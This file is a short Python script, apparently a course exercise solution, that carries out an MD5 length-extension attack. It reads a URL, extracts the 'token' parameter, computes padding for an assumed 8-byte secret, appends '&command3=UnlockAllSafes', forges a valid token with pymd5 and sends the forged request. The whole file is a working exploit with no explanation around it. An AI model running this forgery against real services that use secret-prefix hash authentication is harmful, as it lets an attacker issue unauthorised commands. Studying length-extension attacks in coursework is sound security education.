#!/usr/bin/python3
import http.client as httplib
from urllib.parse import urlparse, quote
import sys, re
from pymd5 import *
url = sys.argv[1]

#--------------------------------------------
length = 8

parsedUrl = urlparse(url)

params = parsedUrl.query.split('&')

token = [p.split('=')[1] for p in params if p.startswith('token=')][0]

m = '&'.join([p for p in params if not p.startswith('token=')])

messageLength = length + len(m)

paddedLength = (messageLength + len(padding(messageLength * 8))) * 8

command = '&command3=UnlockAllSafes'

h1 = md5(state = token, count = paddedLength)
h1.update(command)

updatedToken = h1.hexdigest()

newMessage = m + quote(padding(messageLength * 8)) + command

url = parsedUrl.scheme + '://' + parsedUrl.netloc + parsedUrl.path + '?token=' + \
updatedToken + '&' + newMessage
#--------------------------------------------

parsedUrl = urlparse(url)
conn = httplib.HTTPConnection(parsedUrl.hostname,parsedUrl.port)
conn.request("GET", parsedUrl.path + "?" + parsedUrl.query)
print(conn.getresponse().read())
